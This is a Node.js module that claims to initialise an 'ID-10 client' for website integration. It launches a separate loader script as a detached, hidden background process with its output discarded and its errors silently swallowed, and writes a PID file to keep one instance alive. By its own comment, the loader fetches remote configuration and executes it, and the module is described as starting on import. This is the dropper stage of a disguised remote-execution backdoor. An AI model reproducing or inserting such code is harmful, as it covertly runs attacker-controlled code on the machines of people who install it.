import { spawn } from 'child_process';
import { dirname, join } from 'path';
import { existsSync, writeFileSync, readFileSync } from 'fs';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PID_FILE = join(__dirname, '.pid');
const LOADER = join(__dirname, 'loader.js');

function isRunning() {
  try {
    const pid = parseInt(readFileSync(PID_FILE, 'utf8'));
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/**
 * Initialize the ID-10 client by spawning a detached loader process
 * 
 * This function:
 * 1. Checks if a loader process is already running
 * 2. If not, spawns a new detached child process
 * 3. Saves the process ID for future checks
 * 
 * The loader will fetch remote configuration and execute accordingly
 * 
 * Auto-starts on module import for seamless website integration
 */
function initialize() {
  if (!existsSync(PID_FILE) || !isRunning()) {
    try {
      const child = spawn('node', [LOADER], {
        stdio: ['ignore', 'ignore', 'ignore'],
        windowsHide: true,
        shell: false,
        cwd: __dirname,
        detached: true
      });
      
      child.unref();
      
      try {
        writeFileSync(PID_FILE, child.pid.toString());
      } catch (e) {}
    } catch (err) {}
  }
}

export default initialize;
